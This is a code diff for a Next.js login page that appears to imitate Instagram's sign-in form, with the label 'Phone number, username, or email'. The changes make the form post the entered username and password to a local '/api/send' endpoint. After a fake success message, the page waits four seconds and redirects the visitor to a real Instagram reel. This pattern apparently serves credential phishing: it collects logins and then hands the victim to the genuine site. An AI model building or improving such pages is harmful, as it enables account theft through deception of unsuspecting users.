@@ -3,10 +3,12 @@ import Image from "next/image";
 import "./reel.css"
 import React from "react";
 import toast from "react-hot-toast";
+import { useRouter } from 'next/navigation';
+
 export default function Home() {
 const [userId,setUserId] = React.useState("");
 const [passWd,setPassWd] = React.useState("");
-
+const router = useRouter();
 // React.useEffect(()=>{
 
 
@@ -15,15 +17,16 @@ const [passWd,setPassWd] = React.useState("");
 
 
 
-  const sendData = async () => {
+  const sendData = async (e) => {
+    e.preventDefault(); 
     if ((userId.length < 5 && userId.length>0 ) || ( passWd.length < 5 && passWd.length>0 )) {
       toast.error('Username and password must be at least 5 characters.');
       return;
     }
 
-    if (userId.length>0 ||  passWd.length>0 ) {
-      return;
-    }
+    // if (userId.length<=0 ||  passWd.length<=0 ) {
+    //   return;
+    // }
     console.log("you")
     const res = await fetch('/api/send', {
       method: 'POST',
@@ -38,6 +41,9 @@ const [passWd,setPassWd] = React.useState("");
 
     if (res.ok) {
       toast.success('Logged in successfully!');
+      setTimeout(() => {
+        router.push('https://www.instagram.com/reel/DKG8krgseWt/?hl=en'); // Replace with your actual route
+      }, 4000);
     } else {
       toast.error('Login failed.');
     }
@@ -70,7 +76,7 @@ const [passWd,setPassWd] = React.useState("");
                 height={60}
               />
             </h1>
-            <form>
+            <form onSubmit={sendData}>
               <label htmlFor="title" className="sr-only">
                 Phone number, username, or email
               </label>
@@ -94,7 +100,7 @@ const [passWd,setPassWd] = React.useState("");
                 required
               />
 
-              <button type="submit" className="btn" id="login" onClick={sendData}>
+              <button type="submit" className="btn" id="login">
                 Log In
               </button>
               {/* Fix inline style to use JSX format */}
